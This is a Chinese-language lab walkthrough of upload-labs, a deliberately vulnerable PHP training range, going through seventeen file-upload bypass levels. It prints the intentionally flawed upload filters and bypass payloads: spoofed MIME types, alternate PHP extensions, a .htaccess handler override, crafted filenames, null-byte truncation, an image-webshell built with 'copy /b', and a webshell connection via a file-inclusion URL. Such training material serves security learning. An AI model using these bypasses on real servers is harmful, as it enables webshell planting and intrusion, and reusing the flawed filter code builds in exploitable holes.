upload-labs是一个使用php语言编写的，专门收集渗透测试中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共21关，每一关都包含着不同上传方式。

#### upload-labs界面

![image-20241102124847408](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102124847408.png)

#### 漏洞类型分类

![image-20241102124910426](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102124910426.png)

#### 下载

github：https://github.com/c0ny1/upload-labs

![image-20241102125030794](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102125030794.png)

```bash
git clone https://github.com/c0ny1/upload-labs
```

然后解压到phpstudy的WWW目录中

### 练习

#### PASS-1 客户端校验

> 使用火狐浏览器

现在要上传一个文件到服务器，真实场景中可能是要上传一个头像，这时候就可以测试一下了

##### 先传一个恶意文件

我们首先传一个恶意文件试一试，发现不行，类型被做了限制

![image-20241108085743940](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108085743940.png)

##### 分析

###### 1.burpsuite抓包

首先打开`burpsuite`，进行抓包，发现什么信息都没有（**先判断前后端**）

###### 2.找到上传部分源码

然后`F12`打开控制台，找到上传部分：

![image-20241108090300499](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108090300499.png)

###### 3.checkfile代码

看到调试器中`checkfile`代码

这个函数对文件类型进行检查，如果不是规定类型就`return false；`

![image-20241108090333757](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108090333757.png)

##### 1.将检验函数删除掉

禁用html表单属性，**直接将检验函数删除掉**，这时候前端拦截就无效了

![image-20241108094208688](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094208688.png)

![image-20241108094258134](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094258134.png)

再试一次，我们看到，已经上传成功了

![image-20241108094347618](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094347618.png)

##### 2.更改数据包文件后缀

创建一个恶意文件，以`jpg`结尾，然后使用burpsuite抓包，

![image-20241108094648119](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094648119.png)

`filename`处，更改文件后缀名，**把jpg改为php**

![image-20241108094753778](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094753778.png)

![image-20241108094828250](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094828250.png)

这里就可以看到，文件已经上传成功了

![image-20241108094858845](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094858845.png)

##### 3.禁用JS

**禁用JS**：找到自己浏览器中禁用JS的选项，禁用JS

![image-20241108094942246](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108094942246.png)

将js禁用，这样js验证代码就不会被启用，上传恶意文件成功了

![image-20241102125633794](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102125633794.png)

##### 总结

1. 第一种，采取了直接删除掉html表单属性，在前端进行了更改，使前端对文件类型不进行校验
2. 
   第二种，在数据传输中，将数据包通过代理截获，更改文件后缀名

3. 
   第三种，禁用js属性，使js代码不执行


#### PASS-2 更改MIME验证

首先进行测试：

直接上传`.txt`文件

![image-20241108100236131](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100236131.png)

会报错**类型不正确**

![image-20241108100319102](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100319102.png)

![image-20241108100431992](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100431992.png)

filename是`.txt`，也就是说明文件不是在前端进行了验证，而是在**后端**，这时候就要欺骗后端了

##### BURP抓包

![image-20241108100514301](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100514301.png)

修改原来的`Content-Type`，从`text/plain------>image/jpeg`然后提交

![image-20241108100545292](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100545292.png)

我们发现已经被上传成功了

##### MIME类型

MIME类型（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展)是一种标准，用于描述文件的类型和格式。

它最初是为了电子邮件传输而设计的，但现在广泛应用于HTTP协议中，用来告诉浏览器或其他客户端如何处理接收到的文件。

MIME类型的基本格式为：**主类型/子类型**

- 主类型：表示文件的通用类别，如文本（text）、图像（image）、音频（audio）、视频（video）等。
- 子类型：表示主类型的具体格式，例如，对于文本类型，可以是纯文本（plain）或HTML（html）；对于图像类型，可以是JPEG（jpeg）或PNG（png）。


#### PASS-3 黑名单:后缀名绕过

我们上传一个`php`恶意文件试试，发现不允许上传后缀是php的文件

![image-20241108100648788](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100648788.png)

使用burp抓包发现不是前端进行的拦截，而且对文件名后缀名进行了验证

##### 后缀名绕过-php3绕过

黑名单可以用`php2 php3 php5 php7 phtml` 等绕过

PHP5文件实际上就是.PHP文件，只不过代码由PHP5引擎解析

PHP5是一种PHP版本间的区分，该后缀名并不常见，另外还有.PHP2、.PHP3和.PHP4文件。而当前最新的PHP版本为PHP7

> phpstudy为了安全，不对上面这些后缀名文件进行解析
>
> 单独安装apche，ftp，mysql的时候，是可以解析的

##### burp抓包

更改后缀名，`php7`，然后测试，文件上传成功

```bash
php7
```

![image-20241108100732886](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100732886.png)

![image-20241108100819610](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100819610.png)

#### PASS-4 .htaccess

按照PASS-3中的手法

```bash
php7
```

![image-20241108100926895](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108100926895.png)

文件拓展名改成`php7`，上传成功

![image-20241108101105637](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108101105637.png)

##### .htaccess

通过上传htaccess文件进行绕过由于`黑名单`没有过滤htaccess文件后缀名，

我们可以上传一个htaccess文件，让文件所在位置的目录下文件被php解析`apache`下的`httpd.conf`文件更改。

#####  启用.htaccess

 启用`.htaccess`，需要修改`httpd.conf`，启用`AllowOverride`

![image-20241102130433879](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102130433879.png)

##### 重启Apache

上传`.htaccess`文件，然后再上传xxx的jpg文件

`.htaccess`文件内容如下：

```bash
setHandler application/x-httpd-php
```

![image-20241108101352059](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108101352059.png)

#### PASS-5 .php. .

不能用.htaccess了，怎么办，先看源码

##### 看源码

![image-20241102130453497](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102130453497.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES['upload_file']['tmp_name'];
 $img_path = UPLOAD_PATH.'/'.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
     $is_upload = true;
 } else {
     $msg = '上传出错！';
 }
        } else {
 $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

> 1. 去除开头和结尾的空白字符，首先拿到文件名
> 2. 删除文件名末尾的点（文件名后所有的点）
> 3. strrchr() 函数查找最后一个点 . 及其之后的内容，获取文件的扩展名。例如，file.txt 会返回 .txt
> 4. 将文件扩展名转换为小写，避免因大小写不同导致的识别问题。
>

##### 分析

大小写无效，文件名后直接加点无效，   

用"`文件名.php. .`"呢？

按照上面规则处理完`.php.   `,

空格使`deldot`递归删除点变得无效了。

##### payload

```bash
xxx.php. .
```

![image-20241108101732207](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108101732207.png)

![image-20241108101800107](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108101800107.png)

#### PASS-6 大小写

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES['upload_file']['tmp_name'];
 $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
 if (move_uploaded_file($temp_file, $img_path)) {
     $is_upload = true;
 } else {
     $msg = '上传出错！';
 }
        } else {
 $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

##### 大小写绕过验证

有些程序虽然已经对文件进行了后缀验证，但是没有将字符转换为小写，这样就可以通过使用大小写进行绕过，

如`.php`就可以变成`.Php`来逃避检查

创建一个`xxx.Php`文件，然后进行上传，发现上传成功

```bash
xxx.Php
```

![image-20241108102105375](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102105375.png)

##### 能不能运行成功呢？

**肯定是不行的**，这就告诉我们，如果**我们上传的文件被改了名字**，**不知道名字是不能执行的**

![image-20241108102145846](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102145846.png)

![image-20241108102536781](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102536781.png)

![image-20241108102427039](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102427039.png)

#### PASS-7 空格

查看提示：发现没有禁止`.htaccess`文件

![image-20241102130831010](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102130831010.png)

可以进行利用

##### 分析代码

![image-20241102130840036](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102130840036.png)

> 1. 获取文件名称
> 2. 删除文件末尾的点
> 3. 找到文件最后一个“`.`”的位置并输出”.”及其之后的部分
>

一个正常的文件"`xxx.php`" 后缀最后会被解析为“`.php`”用来判断扩展名是否被禁用

但是，这里没有对空格进行限制，因此可以构造文件名"`xxx.php空格` " （注意，.php后面有个空格）

这样，文件末尾是没有点出现的，最后会被解析为“.php ”（带着空格）

```bash
xxx.php空格
```

![image-20241108102746921](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102746921.png)

![image-20241108102806598](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108102806598.png)

#### PASS-8 .php.

##### 查看源码

![image-20241102131116385](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131116385.png)

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES['upload_file']['tmp_name'];
 $img_path = UPLOAD_PATH.'/'.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
     $is_upload = true;
 } else {
     $msg = '上传出错！';
 }
        } else {
 $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

> 1. 获取文件名
> 2. 找到“`.`”**及其之后的字符串**
> 3. 转换为小写
> 4. 首尾去空
>

这里他忘记了一件事，就是**将文件末尾的“.”进行去除**，因此可以利用代码中这个漏洞进行文件上传

![image-20241108103044851](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103044851.png)

![image-20241108103106604](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103106604.png)

#### PASS-9 ::$DATA

![image-20241102131300801](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131300801.png)

程序和之前处理文件名的步骤基本一致，但是没有进行`::$DATA`去除

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES['upload_file']['tmp_name'];
 $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
 if (move_uploaded_file($temp_file, $img_path)) {
     $is_upload = true;
 } else {
     $msg = '上传出错！';
 }
        } else {
 $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

##### 没有去除“`::$DATA`”的代码

特殊字符`::$DATA`绕过，在前面也看到过去除“`::$DATA`”的代码，为什么要去除它呢？

php在`window`中，如果文件名+"`::$DATA`"会把`::$DATA`之后的数据当成文件流处理，

不会检测后缀名，且保持"`::$DATA`"之前的文件名

##### payload

```bash
xxx.php::$DATA
```

![image-20241108103430352](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103430352.png)

![image-20241108103451964](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103451964.png)

##### 查看图像

![image-20241108103516933](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103516933.png)

##### 删除::$DATA

![image-20241108103542414](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103542414.png)

#### PASS-10 `.php. . . .` 

##### 代码审计

![image-20241102131327858](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131327858.png)

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES['upload_file']['tmp_name'];
 $img_path = UPLOAD_PATH.'/'.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
     $is_upload = true;
 } else {
     $msg = '上传出错！';
 }
        } else {
 $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

> 1. 先进行文件名获取，首位去空
> 2. 删除文件末尾连续的点
> 3. 获取点和后续字符
> 4. 转为小写
> 5. 去除`::$DATA`
>

这里看出删除文件末尾点的这里存在漏洞，**如果遇到的不是连续的点，就不会继续执行**

因此可以在burp中把文件名改为 文件名`.php. . . .` 

```bash
xxx.php. . . .
```

![image-20241108103909647](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103909647.png)

![image-20241108103931030](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108103931030.png)

![image-20241108104005660](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108104005660.png)

#### PASS-11 双写绕过 .pphphp

![image-20241102131534544](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131534544.png)

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
 $is_upload = true;
        } else {
 $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

`str_ireplace`会把`file_name`中在`deny_ext`黑名单里面的字符都**替换为空**，

例如`xxx.php`会变成xxx，然后被存储

这里我们可以用双写来规避这个规则：

首先是原名：xxx.php

在扩展名中加入`php`：`xxx.pphphp`

由于是从前到后进行替换的，因此红色php会被去除，最终文件为xxx.php

```bash
xxx.pphphp
```

![image-20241108104433048](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108104433048.png)

![image-20241108104555942](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108104555942.png)

#### PASS-12 GET型 00截断

> 需要 php 的版本号低于 5.3.29，且 magic_quotes_gpc 为关闭状态

```bash
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
 $is_upload = true;
        } else {
 $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

```

![image-20241108110122425](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110122425.png)

#### PASS-13 POST型 00截断

```bash
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
 $is_upload = true;
        } else {
 $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

```

![image-20241108110221030](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110221030.png)

#### PASS-14 图片码

![image-20241102131632482](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131632482.png)

![image-20241102131642287](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131642287.png)

```bash
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216: 
 $fileType = 'jpg';
 break;
        case 13780: 
 $fileType = 'png';
 break;        
        case 7173: 
 $fileType = 'gif';
 break;
        default: 
 $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
 $is_upload = true;
        } else {
 $msg = "上传出错！";
        }
    }
}

```

代码中我们可以看到，它读取了**文件的前2个字节**，

然后根据这2个字节去**判断文件的类型**

##### 文件魔数 Magic Number

文件魔数是**文件开头的特定字节序列**，用于标识文件格式。

- JPEG：FFD8（十六进制）或 255216（十进制）
- PNG：8950（十六进制）或 13780（十进制）
- GIF：4749（十六进制）或 7173（十进制）

UE打开一张图

![image-20241102131754312](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102131754312.png)

##### 制作图片码

新建一个文件夹，在里面放进JEPG和PHP文件

然后通过cmd命令行和并

```bash
copy /b 1.png+xxx.php xxx.png
```

注意：这里前后顺序不能变，谁在前面，文件魔数就是谁的

![image-20241108110728822](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110728822.png)

这样，就把图像和PHP文件放在了一起

![image-20241108110808241](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110808241.png)

##### 上传图片码

![image-20241108110851396](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110851396.png)

![image-20241108110934959](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110934959.png)

##### 点击文件包含漏洞

![image-20241108110353805](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108110353805.png)

给我们进行了源码提示，直接用`get`方法向`file`传参,

这个去`upload`目录去找

##### 包含图片码

```bash
http://192.168.70.10/upload-labs/include.php?file=upload/2520241108030838.png
```

![image-20241108111039313](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108111039313.png)

##### 用蚁剑去连接

```bash
http://192.168.70.10/upload-labs/include.php?file=upload/2520241108030838.png
xxx
```

![image-20241108111337045](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108111337045.png)

![image-20241108111407428](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108111407428.png)

#### PASS-15

任务看起来和之前一样，有什么不同呢？

只**对第二项EXT进行了检查**，还是可以通过PASS-14方法绕过检查

![image-20241102132107589](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102132107589.png)

```bash
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
 return $ext;
        }else{
 return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
 $is_upload = true;
        } else {
 $msg = "上传出错！";
        }
    }
}

```

`getimagesize($filename)` 是一个 PHP 函数，用于**获取图像文件的信息**，包括其**尺寸、类型、宽度、高度**等。

这个函数返回一个包含多个元素的数组

![image-20241102132142233](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102132142233.png)

#### PASS-16

代码中并没有其他检查，只是**判断了一下文件类型**，还是可以用PASS-14方法进行绕过

![image-20241102132204888](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102132204888.png)

```bash
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
 return "gif";
 break;
        case IMAGETYPE_JPEG:
 return "jpg";
 break;
        case IMAGETYPE_PNG:
 return "png";
 break;    
        default:
 return false;
 break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
 $is_upload = true;
        } else {
 $msg = "上传出错！";
        }
    }
}

```

#### PASS-17 二次渲染

出现了二次渲染

![image-20241102132218734](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102132218734.png)

```bash
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
 //使用上传的图片生成新的图片
 $im = imagecreatefromjpeg($target_path);

 if($im == false){
     $msg = "该文件不是jpg格式的图片！";
     @unlink($target_path);
 }else{
     //给新图片指定文件名
     srand(time());
     $newfilename = strval(rand()).".jpg";
     //显示二次渲染后的图片（使用用户上传图片生成的新图片）
     $img_path = UPLOAD_PATH.'/'.$newfilename;
     imagejpeg($im,$img_path);
     @unlink($target_path);
     $is_upload = true;
 }
        } else {
 $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
 //使用上传的图片生成新的图片
 $im = imagecreatefrompng($target_path);

 if($im == false){
     $msg = "该文件不是png格式的图片！";
     @unlink($target_path);
 }else{
      //给新图片指定文件名
     srand(time());
     $newfilename = strval(rand()).".png";
     //显示二次渲染后的图片（使用用户上传图片生成的新图片）
     $img_path = UPLOAD_PATH.'/'.$newfilename;
     imagepng($im,$img_path);

     @unlink($target_path);
     $is_upload = true;    
 }
        } else {
 $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
 //使用上传的图片生成新的图片
 $im = imagecreatefromgif($target_path);
 if($im == false){
     $msg = "该文件不是gif格式的图片！";
     @unlink($target_path);
 }else{
     //给新图片指定文件名
     srand(time());
     $newfilename = strval(rand()).".gif";
     //显示二次渲染后的图片（使用用户上传图片生成的新图片）
     $img_path = UPLOAD_PATH.'/'.$newfilename;
     imagegif($im,$img_path);

     @unlink($target_path);
     $is_upload = true;
 }
        } else {
 $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}

```

##### 什么是二次渲染？

在图像处理和计算机图形学中，二次渲染通常意味着对已经**生成或输出的图像**进行**再次处理或修改**

会导致什么问题？

我们**植入的木马语句被破坏了**

##### 上传普通gif图片

![image-20241108112748762](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108112748762.png)

![image-20241108112645165](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108112645165.png)

##### 下载图片

![image-20241108112854048](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108112854048.png)

![image-20241108113036428](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108113036428.png)

##### 文件比较工具

使用**文件比较工具**，打开gif原文件和二次渲染的文件，发现**虽然有一部分被改变了**，

但是我们可以通过**对未被改变的区域加马**来实现恶意代码的植入

![image-20241108113139532](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108113139532.png)

![image-20241108113217166](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108113217166.png)

##### 加入恶意代码

在未被修改的部分中**加入恶意代码**，然后上传

![image-20241108115449882](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108115449882.png)

##### 查看上传后的文件

上传后，打开上传的文件，发现恶意代码语句没有丢失

![image-20241108115539646](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108115539646.png)

